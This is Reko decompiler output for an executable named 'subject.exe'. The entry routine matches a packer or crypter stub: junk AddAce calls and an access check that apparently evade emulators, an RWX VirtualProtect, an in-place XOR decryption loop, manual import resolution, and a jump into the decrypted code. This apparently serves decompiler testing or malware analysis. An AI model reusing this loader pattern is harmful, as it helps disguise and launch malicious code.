// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 esi_1214 = AddAce(null, 0x00, 0x00, null, 0x00) + 0x23 + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00) + AddAce(0x00, 0x00, 0x00, 0x00, 0x00);
	Eq_3 ebp_1016 = null;
	if (AreAnyAccessesGranted(~0x00, ~0x00) == 0x00)
		esi_1214 = esi_1214 - 0x22;
	CloseHandle((void *) 0x59);
	VirtualProtect(&globals->v401000, 0x3000, 0x40, fp - 0x0654);
	struct Eq_680 * esp_1003 = fp - 0x0674;
	struct Eq_683 * edx_1006 = null;
	do
	{
		if (ebp_1016 == esi_1214)
			ebp_1016 = null;
		edx_1006[0x00401480] = (struct Eq_683) (edx_1006[0x00401480] ^ ebp_1016[0x00404000]);
		edx_1006 = edx_1006 + 0x01;
		ebp_1016 = (Eq_3) (ebp_1016 + 0x01);
	} while (edx_1006 < (struct Eq_683 *) 5152);
	struct Eq_705 * esi_1034 = &globals->t402760;
	up32 edi_1038 = 0x00;
	up32 dwLoc0660_1042 = 0x00;
	do
	{
		Eq_711 eax_1051 = esi_1034->t0004 - 0x08 >> 0x01;
		word16 * ecx_1054 = (char *) &esi_1034->t0004 + 0x04;
		if (eax_1051 > 0x00)
		{
			Eq_711 ebx_1189 = eax_1051;
			do
			{
				ui32 eax_1193 = (word32) *ecx_1054;
				if ((eax_1193 & 0xF000) == 0x3000)
				{
					struct Eq_741 * eax_1206 = (eax_1193 & 0x0FFF) + esi_1034->dw0000;
					eax_1206->dw401200 = eax_1206->dw401200 + 0xF0401200;
				}
				ecx_1054 = ecx_1054 + 0x01;
				ebx_1189 = ebx_1189 - 0x01;
			} while (ebx_1189 != 0x00);
			edi_1038 = dwLoc0660_1042;
		}
		edi_1038 = (word32) esi_1034->t0004 + edi_1038;
		dwLoc0660_1042 = edi_1038;
		esi_1034 = esi_1034 + Mem1027[esi_1034 + 0x04:word32];
	} while (edi_1038 < 228);
	struct Eq_756 * esi_1070 = &globals->t401F5C;
	esi_1094 = esi_1070;
	esp_1096 = esp_1003;
	if (globals->dw401F6C != 0x00)
	{
		do
		{
			struct Eq_756 * esi_1094;
			struct Eq_680 * esp_1096;
			esp_1096 = esp_1096 - 0x04;
			esp_1096->dw0000 = esi_1094->dw000C + 0x00401200;
			Eq_803 eax_1101 = LoadLibraryA(esp_1096->dw0000);
			if (eax_1101 != null)
			{
				struct Eq_823 * edi_1121 = esi_1094->dw0000;
				if (edi_1121 == null)
					edi_1121 = esi_1094->dw0010;
				Eq_829 eax_1127 = edi_1121->t401200;
				union Eq_833 * edi_1128 = &edi_1121->t401200;
				word32 * esi_1129 = esi_1094->dw0010 + 0x00401200;
				bool S_1132 = cond(eax_1127);
				if (eax_1127 != 0x00)
				{
					do
					{
						Eq_860 eax_1161;
						if (!S_1132)
						{
							LPCSTR * esp_1175 = esp_1096 - 0x04;
							*esp_1175 = (LPCSTR *) (word32) *edi_1128;
							*(esp_1175 - 0x04) = (HMODULE *) eax_1101;
							eax_1161 = GetProcAddress(*(esp_1175 - 0x04), *esp_1175);
						}
						else
						{
							LPCSTR * esp_1183 = esp_1096 - 0x04;
							*esp_1183 = (word32) eax_1127 + 0x00401202;
							*(esp_1183 - 0x04) = (HMODULE *) eax_1101;
							eax_1161 = GetProcAddress(*(esp_1183 - 0x04), *esp_1183);
						}
						*esi_1129 = (word32) eax_1161;
						edi_1128 = (union Eq_833 *) ((char *) edi_1128 + 0x04);
						eax_1127 = *edi_1128;
						esp_1096 = esp_1096 - 0x08;
						esi_1129 = esi_1129 + 0x01;
						S_1132 = cond(eax_1127);
					} while (eax_1127 != 0x00);
				}
				esi_1094 = esp_1096->dw0014;
			}
			esi_1094 = esi_1094 + 0x01;
			esp_1096->dw0014 = esi_1094;
		} while (esi_1094->dw0010 != 0x00);
	}
	ptr32 esp_1074;
	byte SCZO_1075;
	word32 ebx_1076;
	word32 ebp_1077;
	word32 esi_1078;
	word32 edi_1079;
	byte SZO_1080;
	byte C_1081;
	word32 eax_1082;
	word32 ecx_1083;
	byte Z_1084;
	word32 edx_1085;
	byte cl_1086;
	byte S_1087;
	globals->t401C50();
	*(esp_1074 - 0x04) = 0x00;
	ExitProcess(*(esp_1074 - 0x04));
}

